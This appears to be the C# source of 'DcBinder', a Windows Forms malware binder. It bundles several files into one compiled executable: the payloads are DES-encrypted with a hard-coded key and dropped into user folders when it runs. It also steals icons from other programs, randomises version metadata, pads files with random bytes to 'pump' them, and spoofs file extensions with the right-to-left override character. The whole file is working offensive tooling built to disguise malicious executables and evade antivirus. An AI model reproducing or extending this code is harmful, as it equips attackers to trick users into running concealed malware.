using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Toolbelt.Drawing;

namespace DcBinder
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button11_Click(object sender, EventArgs e)
        {
            listView1.Items.Clear();
        }
        private static string ShowDialog(string title, string filter)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = title;
                ofd.Filter = filter;
                return ofd.ShowDialog() == DialogResult.OK ? ofd.FileName : "";
            }
        }
        private void button1_Click(object sender, EventArgs e)
        {
            string pth = ShowDialog("Select a file", "All files (*.*)|*.*");
            if (pth.Length == 0) return;
            ListViewItem lsv = new ListViewItem { Text = pth };
            using (MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider())
            {
                var buffer = md5.ComputeHash(System.IO.File.ReadAllBytes(pth));
                var sb = new StringBuilder();
                foreach (byte t in buffer)
                {
                    sb.Append(t.ToString("x2"));
                }
                lsv.SubItems.Add(sb.ToString());
            }
            listView1.Items.Add(lsv);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem lsv in listView1.SelectedItems)
            {
                listView1.Items.Remove(lsv);
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            string pth = ShowDialog("Choose Icon", "Icons Files(*.exe;*.ico;)|*.exe;*.ico");
            if (pth.Length == 0) return;
            if (pth.ToLower().EndsWith(".exe"))
            {
                string ico = GetIcon(pth);
                textBox1.Text = ico;
                pictureBox1.ImageLocation = ico;
            }
            else
            {
                textBox1.Text = pth;
                pictureBox1.ImageLocation = pth;
            }

        }

        private string GetIcon(string path)
        {
            try
            {
                string tempFile = Path.GetTempFileName() + ".ico";
                using (FileStream fs = new FileStream(tempFile, FileMode.Create))
                {
                    IconExtractor.Extract1stIconTo(path, fs);
                }
                return tempFile;
            }
            catch { }
            return "";
        }

        private void button6_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog sfd = new SaveFileDialog())
            {
                sfd.Filter = @"Executable file (*.exe)|*.exe";
                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    textBox2.Text = sfd.FileName;
                }
            }
        }

        private void button7_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.Items.Count == 0 || textBox2.Text.Length == 0)
                {
                    return;
                }
                string files = "";
                string extensions = "";
                foreach (ListViewItem lsv in listView1.Items)
                {
                    byte[] content = System.IO.File.ReadAllBytes(lsv.Text);
                    extensions += System.IO.Path.GetExtension(lsv.Text) + "/";
                    files += Convert.ToBase64String(content) + ".deadline.";
                }
                extensions = extensions.Remove(extensions.Length - 1, 1);
                string s = Properties.Resources.Source;
                files = Encrypt(files);
                s = s.Replace("%files%", files);
                s = s.Replace("%ext%", extensions);
                switch (comboBox1.SelectedIndex)
                {
                    case 1:
                        s = s.Replace("ApplicationData", "MyDocuments");
                        break;
                    case 2:
                        s = s.Replace("ApplicationData", "MyPictures");
                        break;
                    case 3:
                        s = s.Replace("ApplicationData", "MyMusic");
                        break;
                    case 4:
                        s = s.Replace("ApplicationData", "Desktop");
                        break;
                }

                if (txtProduct.Text.Length != 0 && txtProductVersion.Text.Length != 0 && txtFileVersion.Text.Length != 0 && txtCompany.Text.Length != 0 && txtCopyright.Text.Length != 0)
                {
                    string assembly = Properties.Resources.Assembly;
                    assembly = assembly.Replace("[TITLE]", txtProduct.Text);
                    assembly = assembly.Replace("[DESCRIPTION]", txtDescription.Text);
                    assembly = assembly.Replace("[COPYRIGHT]", txtCopyright.Text);
                    assembly = assembly.Replace("[VERSION]", txtProductVersion.Text);
                    assembly = assembly.Replace("[FILE-VERSION]", txtFileVersion.Text);
                    assembly = assembly.Replace("[COMPANY]", txtCompany.Text);
                    assembly = assembly.Replace("[PRODUCT]", txtProduct.Text);
                    s = s.Replace("[AssemblyHere]", assembly);
                }
                else
                {
                    s = s.Replace("[AssemblyHere]", "");
                }

                CompilerParameters compar = new CompilerParameters();
                string option = "/target:winexe /optimize+";
                if (textBox1.Text != "" && System.IO.File.Exists(textBox1.Text))
                {
                    option += " " + "/win32icon:" + "\"" + textBox1.Text + "\"";
                }

                compar.CompilerOptions = option;
                compar.GenerateExecutable = true;
                compar.IncludeDebugInformation = false;
                compar.OutputAssembly = textBox2.Text;
                compar.GenerateInMemory = false;
                compar.ReferencedAssemblies.Add("System.dll");
                compar.TreatWarningsAsErrors = false;

                string ver = "v2.0";
                switch (comboBox2.SelectedIndex)
                {
                    case 0:
                        ver = "v2.0";
                        break;
                    case 1:
                        ver = "v3.0";
                        break;
                    case 2:
                        ver = "v3.5";
                        break;
                    case 3:
                        ver = "v4.0";
                        break;
                }
                CompilerResults r = new CSharpCodeProvider(new Dictionary<string, string> { { "CompilerVersion", ver } }).CompileAssemblyFromSource(compar, s);

                if (r.Errors.HasErrors)
                {
                    string error = "The following compile error occured:\r\n";
                    foreach (CompilerError err in r.Errors)
                    {
                        error += "File: " + err.FileName + "; Line (" + err.Line + ") - " + err.ErrorText + "\n";
                    }
                    MessageBox.Show(error, "DcBinder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "DcBinder", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private static string Encrypt(string originalString)
        {
            try
            {
                byte[] bytes = Encoding.ASCII.GetBytes("DeadLine");
                DESCryptoServiceProvider descsp = new DESCryptoServiceProvider();
                System.IO.MemoryStream memStream = new System.IO.MemoryStream();
                CryptoStream cStream = new CryptoStream(memStream, descsp.CreateEncryptor(bytes, bytes), CryptoStreamMode.Write);
                System.IO.StreamWriter str = new System.IO.StreamWriter(cStream);
                str.Write(originalString);
                str.Flush();
                cStream.FlushFinalBlock();
                str.Flush();
                return Convert.ToBase64String(memStream.GetBuffer(), 0, (int)memStream.Length);
            }
            catch
            {
                return "";
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            Random rnd = new Random();
            int num = rnd.Next(1, 20);
            txtProduct.Text = RandomString(num);
            num = rnd.Next(1, 20);
            txtDescription.Text = RandomString(num);
            num = rnd.Next(1, 20);
            txtCopyright.Text = RandomString(num);
            num = rnd.Next(1, 20);
            txtCompany.Text = RandomString(num);
            txtProductVersion.Text = rnd.Next(0, 20) + @"." + rnd.Next(0, 20) + @"." + rnd.Next(0, 20) + @"." + rnd.Next(0, 20);
            txtFileVersion.Text = rnd.Next(0, 20) + @"." + rnd.Next(0, 20) + @"." + rnd.Next(0, 20) + @"." + rnd.Next(0, 20);
        }

        private static string RandomString(int size)
        {
            Random r = new Random();
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            char[] buffer = new char[size];
            for (int i = 0; i < size; i++)
            {
                buffer[i] = chars[r.Next(chars.Length)];
            }
            return new string(buffer);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            txtProduct.Text = "";
            txtDescription.Text = "";
            txtCopyright.Text = "";
            txtCompany.Text = "";
            txtProductVersion.Text = "";
            txtFileVersion.Text = "";
            textBox1.Text = "";
            pictureBox1.Image = null;
        }

        private void button8_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog { Filter = @"All files (*.*)|*.*" };
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                textBox3.Text = ofd.FileName;
            }
        }

        private void button9_Click(object sender, EventArgs e)
        {
            if (textBox3.Text == "")
            {
                MessageBox.Show("Please select a file !", "DcBinder", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }
            if (textBox5.Text.Length == 0)
            {
                MessageBox.Show("Please enter a valid ammount !", "DcBinder", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }
            try
            {
                int ammount = 0;
                Random rnd = new Random();
                byte[] data = new byte[1];
                System.IO.FileStream fs = new System.IO.FileStream(textBox3.Text, System.IO.FileMode.Append);
                switch (comboBox3.SelectedIndex)
                {
                    case 0:
                        ammount = int.Parse(textBox5.Text);
                        break;
                    case 1:
                        ammount = int.Parse(textBox5.Text) * 1024;
                        break;
                    case 2:
                        ammount = (int.Parse(textBox5.Text) * 1024) * 1024;
                        break;
                }
                for (int i = 0; i <= ammount - 1; i++)
                {
                    rnd.NextBytes(data);
                    fs.WriteByte(data[0]);
                }
                fs.Close();
                MessageBox.Show("The selected file has been pumped !", "DcBinder", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "DcBinder", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button10_Click(object sender, EventArgs e)
        {
            try
            {
                if (textBox3.Text == "")
                {
                    MessageBox.Show("Please select a file !", "DcBinder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                if (textBox4.Text == "")
                {
                    MessageBox.Show("Please select an extension !", "DcBinder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                int length = textBox3.Text.Length - 4;
                const char ch = '‮';
                char[] array = textBox4.Text.ToCharArray();
                Array.Reverse(array);
                string destFileName = string.Concat(new object[] { textBox3.Text.Substring(0, length), ch, new string(array), textBox3.Text.Substring(length) });
                System.IO.File.Move(textBox3.Text, destFileName);
                MessageBox.Show("The extension has been spoofed !", "DcBinder", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "DcBinder", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void textBox4_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == '.')
            {
                e.Handled = true;
            }
        }

        private void textBox1_DragEnter(object sender, DragEventArgs e)
        {
            e.Effect = e.Data.GetDataPresent(DataFormats.FileDrop) ? DragDropEffects.Copy : DragDropEffects.None;
        }

        private void textBox1_DragDrop(object sender, DragEventArgs e)
        {
            string[] fileList = (string[])e.Data.GetData(DataFormats.FileDrop, false);
            if (System.IO.Path.GetExtension(fileList[0]) != ".ico") return;
            textBox1.Text = fileList[0];
            pictureBox1.ImageLocation = textBox1.Text;
        }
    }
}
